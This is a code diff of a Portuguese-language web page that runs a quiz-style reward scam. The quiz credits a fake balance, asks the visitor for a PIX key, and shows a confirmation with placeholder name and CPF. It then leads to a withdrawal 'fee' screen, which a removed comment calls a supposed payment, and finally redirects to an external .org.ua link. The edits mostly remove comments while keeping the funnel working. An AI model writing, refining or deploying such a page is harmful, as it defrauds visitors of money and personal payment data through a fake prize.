@@ -233,7 +233,7 @@
         color: #6a0dad;
     }
 
-    /* AQUI É ONDE SEU CÓDIGO ORIGINAL ESCONDE TUDO EXCETO O CONTAINER PRINCIPAL */
+    /* CORREÇÃO CRÍTICA: Manter o quizContainer visível e esconder as demais */
     .resgate-container, .taxa-container, .envio-container { display:none; }
 
     .resgate-title {
@@ -790,21 +790,21 @@ const saldoTopo = document.getElementById("saldoTopo");
 const progressBar = document.getElementById("progressBar");
 
 // Elementos das Telas
-const btnSaqueOriginal = document.getElementById("btnSaque"); // Renomeado para não conflitar com a Ação Original
+const btnSaqueOriginal = document.getElementById("btnSaque");
 const resgateContainer = document.getElementById("resgateContainer");
 const taxaContainer = document.getElementById("taxaContainer");
 const envioContainer = document.getElementById("envioContainer"); 
 const quizContainer = document.getElementById("quizContainer"); 
 
-const btnTaxaSacar = document.getElementById("btnTaxaSacar"); // Botão "REALIZAR SAQUE" da tela de taxa
-const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botão da tela de envio
+const btnTaxaSacar = document.getElementById("btnTaxaSacar");
+const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio");
 
-// NOVO: Variáveis para o Pop-up de Conquista
+// Variáveis para o Pop-up de Conquista
 const popupConquista = document.getElementById("popupConquista");
 const btnConquista = document.getElementById("btnConquista");
 
 
-// NOVO: Elementos do Pop-up de Confirmação
+// Elementos do Pop-up de Confirmação
 const popupConfirmacao = document.getElementById("popupConfirmacao");
 const popupContentLoading = document.getElementById("popupContentLoading");
 const popupContentConfirm = document.getElementById("popupContentConfirm");
@@ -815,22 +815,22 @@ const confirmarNome = document.getElementById("confirmarNome");
 const confirmarCpf = document.getElementById("confirmarCpf");
 const confirmarPix = document.getElementById("confirmarPix");
 
-const inputChavePix = document.getElementById("chavePix"); // Já existente
+const inputChavePix = document.getElementById("chavePix");
 
-// Função de progresso original
+// Função de progresso
 function atualizarProgresso() {
     const progresso = ((etapa) / perguntas.length) * 100;
     progressBar.style.width = progresso + "%";
 }
 
-// Função de brilho original
+// Função de brilho
 function brilho(el) {
     el.classList.remove("shine");
     void el.offsetWidth;
     el.classList.add("shine");
 }
 
-// Função de carregar pergunta original
+// Função de carregar pergunta
 function carregarPergunta() {
     atualizarProgresso();
 
@@ -838,7 +838,7 @@ function carregarPergunta() {
     title.innerText = q.titulo;
     optionsBox.innerHTML = "";
     selected = false;
-    btn.classList.remove("enabled"); // Garante que o botão comece desabilitado
+    btn.classList.remove("enabled");
 
     q.opcoes.forEach(op => {
         const div = document.createElement("div");
@@ -854,7 +854,7 @@ function carregarPergunta() {
     });
 }
 
-// Ação do botão "Continuar" original
+// Ação do botão "Continuar"
 btn.onclick = () => {
     if (!selected) return;
 
@@ -881,7 +881,7 @@ btn.onclick = () => {
     brilho(saldoTopo);
 };
 
-// Ação do botão do pop-up de recompensa original
+// Ação do botão do pop-up de recompensa
 popupBtn.onclick = () => {
     popup.style.display = "none";
     etapa++;
@@ -901,7 +901,7 @@ popupBtn.onclick = () => {
     carregarPergunta();
 };
 
-// Ação do botão final do quiz original
+// Ação do botão final do quiz
 finalBtn.onclick = () => {
     quizContainer.style.display = "none";
     document.getElementById("popupFinal").style.display = "none";
@@ -912,11 +912,10 @@ finalBtn.onclick = () => {
 };
 
 // =========================================================
-// FUNÇÃO ORIGINAL DO BOTÃO DE SAQUE (ISOLADA)
-// É esta função que o botão SIM deve chamar no final.
+// FUNÇÃO ORIGINAL DO BOTÃO DE SAQUE
 // =========================================================
 const acaoOriginalSaque = () => {
-    // 1. Botão da Tela de Resgate -> Tela de Taxa (Função Original)
+    // Botão da Tela de Resgate -> Tela de Taxa
     resgateContainer.style.display = "none";
     taxaContainer.style.display = "block";
 };
@@ -925,9 +924,8 @@ const acaoOriginalSaque = () => {
 // NOVO: INTERCEPTAÇÃO DO BOTÃO SAQUE (btnSaque)
 // =========================================================
 btnSaqueOriginal.onclick = (e) => {
-    e.preventDefault(); // Impede a ação original do botão de acontecer imediatamente
+    e.preventDefault();
     
-    // Validação básica do campo PIX (já que nome/cpf não existem no HTML original)
     if (!inputChavePix.value) {
         alert("Por favor, preencha sua Chave PIX para continuar.");
         return;
@@ -941,7 +939,6 @@ btnSaqueOriginal.onclick = (e) => {
     // 2. Simular carregamento de 4 segundos
     setTimeout(() => {
         // 3. Preencher e mostrar a tela de confirmação
-        // Usamos placeholders para Nome e CPF conforme a lógica solicitada.
         confirmarNome.innerText = "Usuário Apple"; 
         confirmarCpf.innerText = "999.999.999-99"; 
         confirmarPix.innerText = inputChavePix.value;
@@ -953,45 +950,43 @@ btnSaqueOriginal.onclick = (e) => {
 
 // 4. Ação do Botão "NÃO"
 btnConfirmarNao.onclick = () => {
-    popupConfirmacao.style.display = "none"; // Apenas fecha o pop-up
+    popupConfirmacao.style.display = "none";
 };
 
 // 5. Ação do Botão "SIM, RECEBER AGORA"
 btnConfirmarSim.onclick = () => {
-    popupConfirmacao.style.display = "none"; // Fecha o pop-up
-    acaoOriginalSaque(); // Chama a função original para continuar o fluxo
+    popupConfirmacao.style.display = "none";
+    acaoOriginalSaque();
 };
 // =========================================================
-// FIM NOVO CÓDIGO DO POP-UP
+// FIM CÓDIGO DO POP-UP
 // =========================================================
 
 
-// 2. Botão da Tela de Taxa -> Tela de Envio (Ação original, permanece inalterada)
+// Botão da Tela de Taxa -> Tela de Envio
 btnTaxaSacar.onclick = () => {
-    // Avança para a tela de envio (após o suposto pagamento)
     taxaContainer.style.display = "none";
     envioContainer.style.display = "block";
 };
 
-// 3. NOVO: Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA (Ação original, permanece inalterada)
+// Botão da Tela de Envio -> MOSTRA POP-UP DE CONQUISTA
 btnFinalizarEnvio.onclick = () => {
-    // Oculta a tela de envio e mostra o novo pop-up (conforme solicitado)
     envioContainer.style.display = "none";
     popupConquista.style.display = "flex";
 };
 
-// 4. NOVO: Botão do Pop-up de Conquista -> Redirecionamento Final (Ação original, permanece inalterada)
+// Botão do Pop-up de Conquista -> Redirecionamento Final
 btnConquista.onclick = () => {
-    // Redireciona para o link fornecido após o clique no pop-up
     window.location.href = "https://compraseguraonline.org.ua/c/d4df49a4ff";
 };
 
 // =========================================================
-// FIX DEFENSIVO PARA GARANTIR QUE O QUIZ APAREÇA NO INÍCIO
+// CORREÇÃO FINAL PARA GARANTIR O INÍCIO DO QUIZ
+// Garante que o quiz comece a carregar SOMENTE após todo o HTML ter sido processado.
 // =========================================================
-quizContainer.style.display = "block";
-
-carregarPergunta();
+window.onload = function() {
+    carregarPergunta();
+};
 </script>
 
 
